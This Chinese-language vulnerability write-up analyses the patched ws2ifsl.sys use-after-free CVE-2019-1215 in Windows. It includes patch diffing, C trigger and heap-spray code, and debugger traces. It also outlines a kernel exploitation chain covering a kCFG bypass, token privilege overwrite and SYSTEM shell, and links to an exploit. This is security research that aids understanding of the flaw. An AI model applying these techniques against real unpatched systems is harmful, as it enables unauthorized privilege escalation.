![](https://image.3001.net/images/20200202/1580642651_5e36b15b49721.jpg!small)

**在这篇文章中，我们将对近期刚刚修复的用后释放漏洞（CVE-2019-1215）进行分析，该漏洞存在于ws2ifsl.sys中，一旦成功利用，攻击者将有可能实现本地提权。在此之前，Windows
7、Windows 8、Windows 10、Windows 2008、Windows 2012和Windows
2019都存在这个漏洞，但是微软已经在2019年9月份成功将其[ _修复_](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1215)了。**

接下来，我们将对漏洞的成因进行分析，并尝试在Windows 10 19H1（1903）x64平台上进行测试。

## ws2ifsl介绍

ws2ifsl组件是一个与winsocket相关的驱动程序，这个驱动程序可以实现两个对象：

> 一个进程对象
>
> 一个socket对象

这个驱动程序实现了几个调度程序，在调用NtCreateFile时，文件名会被设置为\Device\WS2IFSL\，将调用DispatchCreate函数，函数将根据文件名中的_FILE_FULL_EA_INFORMATION.EaName字符串进行判断，如果是NifsPvd，它将调用CreateProcessFile，如果是NifsSct，它将调用CreateSocketFile。

CreateSocketFile和CreateProcessFile函数都创建内部对象，称为“procData”和“socketData”。创建后，这些对象将保存在文件对象的_FILE_OBJECT.FsContext中，而这个文件对象是在dispatch
routine中创建的。

文件对象可以在用户模式中访问，即从NtCreateFile返回的句柄对象。该句柄可用于执行DeviceIoControl或调用WriteFile。“procData”和“sockedData”对象并没有直接引用ObfReferenceObject和ObfDereferenceObject，而是引用了底层的文件对象。除此之外，驱动程序实现了两个APC对象，分别为“request
queue”和“cancel
queue”。APC机制是在另一个线程中异步执行函数，因为可以在另一个线程中强制执行多个APC，所以内核实现了一个队列，其中存储了所有要执行的APC。

“procData”对象包含这两个APC对象，并由CreateProcessFile在initializerqueue和InitializeCancelQueue中初始化。一个APC对象由KeInitializeApc初始化，并接收一个目标线程和一个函数作为参数。此外，还设置了处理器模式（内核或用户模式）以及RundownRoutine。如果是ws2ifsl，则RundownRoutine为
RequestRundownRoutine和
CancelRundownRoutine，则处理器模式设置为用户模式。这些RundownRoutine用于清理，如果线程有机会在APC内部执行之前死亡，则由内核调用。之所以会发生这种情况，是因为仅当APC设置为alertable状态时，才进入线程内执行它。例如，如果调用SleepEx时第二个参数设置为TRUE，则可以将线程设置为alertable状态。

驱动程序还在DispatchReadWrite中实现了一个读写dispatch的程序，并且只有socket对象可访问，它还可以调用DoSocketReadWrite。这个函数通过调用SignalRequest函数并使用nt!KeInsertQueueApc函数来将APC元素添加到APC队列中。

与驱动进行通信

在某些情况下，驱动程序将会自动创建符号链接，并且其名称可以用作CreateFileA的文件名
，但是ws2ifsl并非如此。它只能在nt!IoCreateDevice的DeviceName设置为
‘DeviceWS2IFSL’情况下调用。但是，我们通过调用本地API
NtOpenFile，就可以访问派遣函数ws2ifsl!DispatchCreate了。相关代码如下：

    
    
    HANDLE fileHandle = 0;
    
    UNICODE_STRING deviceName;
    
    RtlInitUnicodeString(&deviceName, (PWSTR)L"\\Device\\WS2IFSL");
    
    OBJECT_ATTRIBUTES object;
    
    InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);
    
    IO_STATUS_BLOCK IoStatusBlock ;
    
    NtOpenFile(&fileHandle, GENERIC_READ, &object, &IoStatusBlock, 0, 0);

DispatchCreate函数会检查调用的扩展属性，该属性只能通过NtCreateFile系统调用进行设置。

针对process对象，扩展属性(ea)数据缓冲区中必须包含一个属于当前进程的线程句柄，在之后的才做中将需要使用到这个线程句柄。

## 补丁分析

首先，我们需要对ws2ifsl未修复版本(10.0.18362.1)和修复版本(10.0.18362.356)进行对比。

修复的函数如下：

    
    
    CreateProcessFile
    
    DispatchClose
    
    SignalCancel
    
    SignalRequest
    
    RequestRundownRoutine
    
    CancelRundownRoutine

![](https://image.3001.net/images/20200202/1580642677_5e36b17546638.png!small)

### 修复后的版本多了一个函数：

    
    
    DereferenceProcessContext

其中最明显的是，所有修复后的函数都包含了针对新函数DereferenceProcessContext的调用：

![](https://image.3001.net/images/20200202/1580642685_5e36b17daab4c.png!small)

“procData”对象新增了一个新成员，并使用了引用计数。比如说，在负责所有初始化的CreateProcessFile中，这个新成员都被设置为1。

### 旧版本：

    
    
    procData->tag = 'corP';
    
    *(_QWORD *)&procData->processId = PsGetCurrentProcessId();
    
    procData->field_100 = 0;

### 新版本：

    
    
    procData->tag = 'corP';
    
    *(_QWORD *)&procData->processId = PsGetCurrentProcessId();
    
    procData->dword100 = 0;
    
    procData->referenceCounter = 1i64; // new

DereferenceProcessContex函数将会检查引用计数，并调用nt!ExFreePoolWithTag。

新版的DispatchClose函数将从调用nt!ExFreePoolWithTag改变为调用DereferenceProcessContext，也就是说，如果引用计数不是零，那么“procData”将不会被释放，只会将其引用计数递减一。

修复后的SignalRequest会在调用nt!KeInsertQueueApc之前增加referenceCounter。

漏洞之所以会存在，就是因为即使请求一个已在队列中的APC，DispatchClose函数仍然可以释放“procData”对象。每当关闭文件句柄的最后一个引用时(通过调用CloseHandle)，就会调用DispatchClose函数。

新版本通过使用新的referenceCounter来确保缓冲区只有在最后一个引用被删除之后才会被释放。如果是RundownRoutine（包含引用），则在函数末尾删除
DereferenceProcessContext引用，并在调用nt!KeInsertQueueApc之前让引用计数加一。如果发生错误，该引用也会被删除（避免内存泄漏）。

## 漏洞触发

要触发这个漏洞，我们首先要创建一个“procData”句柄和一个“socketData”句柄，然后向“socketData”写入恶意数据并关闭两个句柄。接下来，线程将会终止调用APC
RundownRoutine，并处理释放的数据。

漏洞触发代码：

    
    
    <..>
    
    in CreateProcessHandle:
    
     
    
        g_hThread1 = CreateThread(0, 0, ThreadMain1, 0, 0, 0);
    
        eaData->a1 = (void*)g_hThread1; // thread must be in current process
    
        eaData->a2 = (void*)0x2222222;  // fake APC Routine
    
        eaData->a3 = (void*)0x3333333;  // fake cancel Rundown Routine
    
        eaData->a4 = (void*)0x4444444;
    
        eaData->a5 = (void*)0x5555555;
    
         
    
        NTSTATUS status = NtCreateFile(&fileHandle, MAXIMUM_ALLOWED, &object, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, 0, eaBuffer, sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));
    
        DWORD supSuc = SuspendThread(g_hThread1);
    
    <..>
    
    in main:
    
     
    
    HANDLE procHandle = CreateProcessHandle();
    
    HANDLE sockHandle = CreateSocketHandle(procHandle);
    
     
    
    char* writeBuffer = (char*) malloc(0x100);
    
         
    
    IO_STATUS_BLOCK io;
    
    LARGE_INTEGER byteOffset;
    
    byteOffset.HighPart = 0;
    
    byteOffset.LowPart = 0;
    
    byteOffset.QuadPart = 0;
    
    byteOffset.u.LowPart = 0;
    
    byteOffset.u.HighPart = 0;
    
    ULONG key = 0; 
    
     
    
    CloseHandle(procHandle);
    
     
    
    NTSTATUS ret = NtWriteFile(sockHandle, 0, 0, 0, &io, writeBuffer, 0x100, &byteOffset, &key);

在DispatchClose释放处设置一个断点，我们将会看到：

    
    
    Breakpoint 2 hit
    
    ws2ifsl!DispatchClose+0x7d:
    
    fffff806`1b8e71cd e8ceeef3fb      call    nt!ExFreePool (fffff806`178260a0)
    
    1: kd> db rcx
    
    ffffae0d`ceafbc70  50 72 6f 63 00 00 00 00-8c 07 00 00 00 00 00 00  Proc............
    
    1: kd> g
    
    Breakpoint 0 hit
    
    ws2ifsl!RequestRundownRoutine:
    
    fffff806`1b8e12d0 48895c2408      mov     qword ptr [rsp+8],rbx
    
    0: kd> db rcx-30
    
    ffffae0d`ceafbc70  50 72 6f 63 00 00 00 00-8c 07 00 00 00 00 00 00  Proc............

因为procData对象已经被释放，所以RundownRoutine将处理释放的数据。一般来说此时不会发生崩溃，因为数据块没有重新分配。

## 堆喷射

接下来，我们来看看如何利用该漏洞。

首先，我们需要知道缓冲区和分配池的大小。

在要释放的缓冲区上使用pool命令，我们可以看到它分配在Nonpaged pool上，大小为0x120字节。

    
    
    1: kd> !pool ffff8b08905e9910
    
    Pool page ffff8b08905e9910 region is Nonpaged pool
    
    <..>
    
    *ffff8b08905e9900 size:  120 previous size:    0  (Allocated) *Ws2P Process: ffff8b08a32e3080
    
            Owning component : Unknown (update pooltag.txt)

查看ws2ifsl!CreateProcessFile中分配的缓冲区，我们可以看到：

    
    
    PAGE:00000001C00079ED mov     edx, 108h       ; size
    
    PAGE:00000001C00079F2 mov     ecx, 200h       ; PoolType
    
    PAGE:00000001C00079F7 mov     r8d, 'P2sW'     ; Tag
    
    PAGE:00000001C00079FD call    cs:__imp_ExAllocatePoolWithQuotaTag

以下代码可用于为多个0x120字节的缓冲区分配用户控制的数据：

    
    
    int doHeapSpray()
    
    {
    
        for (size_t i = 0; i < 0x5000; i++)
    
        {
    
            HANDLE readPipe;
    
            HANDLE writePipe;
    
            DWORD resultLength;
    
            UCHAR payload[0x120 - 0x48];
    
            RtlFillMemory(payload, 0x120 - 0x48, 0x24);
    
     
    
            BOOL res = CreatePipe(&readPipe, &writePipe, NULL, sizeof(payload));
    
     
    
            res = WriteFile(writePipe, payload, sizeof(payload), &resultLength, NULL);
    
        }  
    
        return 0;
    
    }

如果我们将这个堆喷射合并到漏洞触发代码中，我们就能在nt!KiInsertQueueApc中触发一次漏洞检查，而程序崩溃是由于对“liked
list”操作所引起的。

    
    
    .text:00000001400A58F6 mov     rax, [rdx]
    
    .text:00000001400A58F9 cmp     [rax+_LIST_ENTRY.Blink], rdx
    
    .text:00000001400A58FD jnz     fail_fast
    
    <..>
    
    .text:00000001401DC2EA fail_fast:                              ; CODE XREF: KiInsertQueueApc+53↑j
    
    .text:00000001401DC2EA                                         ; KiInsertQueueApc+95↑j ...
    
    .text:00000001401DC2EA                 mov     ecx, 3
    
    .text:00000001401DC2EF                 int     29h             ; Win8: RtlFailFast(ecx)

错误检查在命令int 29处执行，在检查发生崩溃的寄存器时，我们可以看到RAX寄存器指向的是我们控制的数据。

    
    
    rax=ffff8b08905e82d0 rbx=0000000000000000 rcx=0000000000000003
    
    rdx=ffff8b08a39c3128 rsi=0000000000000000 rdi=0000000000000000
    
    rip=fffff8057489a2ef rsp=ffffde8268bfd4c8 rbp=ffffde8268bfd599
    
     r8=ffff8b08a39c3118  r9=fffff80574d87490 r10=fffff80574d87490
    
    r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
    
    r14=0000000000000000 r15=0000000000000000
    
     
    
    0: kd> dq ffff8b08905e82d0
    
    ffff8b08`905e82d0  24242424`24242424 24242424`24242424
    
    ffff8b08`905e82e0  24242424`24242424 24242424`24242424
    
    ffff8b08`905e82f0  24242424`24242424 24242424`24242424
    
    ffff8b08`905e8300  24242424`24242424 24242424`24242424
    
    ffff8b08`905e8310  24242424`24242424 24242424`24242424
    
    ffff8b08`905e8320  24242424`24242424 24242424`24242424
    
    ffff8b08`905e8330  24242424`24242424 24242424`24242424
    
    ffff8b08`905e8340  24242424`24242424 24242424`24242424

导致崩溃的调用栈如下：

    
    
    0: kd> k
    
     # Child-SP          RetAddr           Call Site
    
    00 ffffb780`3ac7e868 fffff804`334a90c2 nt!DbgBreakPointWithStatus
    
    01 ffffb780`3ac7e870 fffff804`334a87b2 nt!KiBugCheckDebugBreak+0x12
    
    02 ffffb780`3ac7e8d0 fffff804`333c0dc7 nt!KeBugCheck2+0x952
    
    03 ffffb780`3ac7efd0 fffff804`333d2ae9 nt!KeBugCheckEx+0x107
    
    04 ffffb780`3ac7f010 fffff804`333d2f10 nt!KiBugCheckDispatch+0x69
    
    05 ffffb780`3ac7f150 fffff804`333d12a5 nt!KiFastFailDispatch+0xd0
    
    06 ffffb780`3ac7f330 fffff804`333dd2ef nt!KiRaiseSecurityCheckFailure+0x325
    
    07 ffffb780`3ac7f4c8 fffff804`332cb84f nt!KiInsertQueueApc+0x136a87
    
    08 ffffb780`3ac7f4d0 fffff804`3323ec58 nt!KiSchedulerApc+0x22f
    
    09 ffffb780`3ac7f600 fffff804`333c5002 nt!KiDeliverApc+0x2e8
    
    0a ffffb780`3ac7f6c0 fffff804`33804258 nt!KiApcInterrupt+0x2f2
    
    0b ffffb780`3ac7f850 fffff804`333c867a nt!PspUserThreadStartup+0x48
    
    0c ffffb780`3ac7f940 fffff804`333c85e0 nt!KiStartUserThread+0x2a
    
    0d ffffb780`3ac7fa80 00007ff8`ed3ace50 nt!KiStartUserThreadReturn
    
    0e 0000009e`93bffda8 00000000`00000000 ntdll!RtlUserThreadStart

上述代码中，因为主线程的突然终止而触发了错误检测，之所以会发生这种情况，是因为我们破坏的APC仍然在队列中，而断开连接操作可以处理损坏的数据。因为前后指针已损坏并且没有指向有效的链接列表，因此会引发安全断开检查。

### KeRundownApcQueues

我们需要将释放的APC元素转换为有效的内容，在触发错误并重写旧的“prodata”之后，需要退出APC队列的线程。此时，内核将调用nt!KeRundownApcQueues函数并检查nt!KiFlushQueueApc!。

此时，我们就可以控制缓冲区的内容了，我们可以避免安全异常，因为链表的有效指针使用了一个指向“kthread”内部的值来检查。假如我们以中等完整性级别运行，那么使用SystemHandleInformation调用NtQuerySystemInformation则可能会泄漏“kthread”的地址。如果我们使用“kthread”地址来创建回收的“procData”，并且nt!KeRundownApcQueues尝试在“procData”对象中执行用户控制的函数指针，我们就可以避免触发错误检查了。

### 绕过kCFG

在我们控制了想要执行的函数指针之后，还有一个需要克服的小障碍。在中等完整性级别下，可以通过NtQuerySystemInformation /
SystemModuleInformation泄漏所有加载模块的基地址。因此，我们现在至少知道可以将执行转移到何处。

但是，APC函数指针调用由Microsoft实现的CFI内核控制流保护。如果我们调用随机ROP gadget,内核会抛出一个错误检查。

幸运的是，从CFG的角度来看，函数序言都是有效的分支目标，因此我们知道可以调用什么而不必停止。在调用nt!KeRundownApcQueues函数指针时，第一个参数（rcx）指向“procData”缓冲区，第二个参数（rdx）为零。

我们可以使用的另一种可能性是通过调用本地函数NtTestAlert来调用APC函数指针。

当使用NtTestAlert调用APC函数指针时，第一个参数(rcx)指向“procData”缓冲区，第二个参数(rdx)也指向它。

在寻找一些小函数，根据给定的约束执行操作之后，我们找到了一个合适的对象：nt!SeSetAccessStateGenericMapping。

如下所示，nt!SeSetAccessStateGenericMapping可用于执行16字节的任意写入：

![](https://image.3001.net/images/20200202/1580642761_5e36b1c9d7646.png!small)

但是，这16个字节的后半部分未被完全控制，但是前8个字节是基于堆喷射所提供的数据。

### 令牌覆盖

在旧的Windows版本中，有很多技术可以将一个任意的写操作转换成一个完整的内核读写原语。最简单的方法是在启用所有位的情况下覆盖此结构的Present和Enabled成员。这将让我们获得SeDebugPrivilege特权，允许我们将代码注入到高特权进程中，比如说“winlogon.exe”。

### 获取系统权限

一旦我们将代码注入到了系统进程中，我们就可以运行“cmd.exe”，然后拿到交互式的shell。与此同时，我们还避免了kCFG和SMEP等许多问题，因为我们不执行ROP或在错误的上下文中执行任何ring0代码。

### 漏洞利用代码

> Windows 10 19H1 x64：【[
> _点我获取_](https://github.com/bluefrostsecurity/CVE-2019-1215)】

 *** 参考来源：[
_bluefrostsecurity_](https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

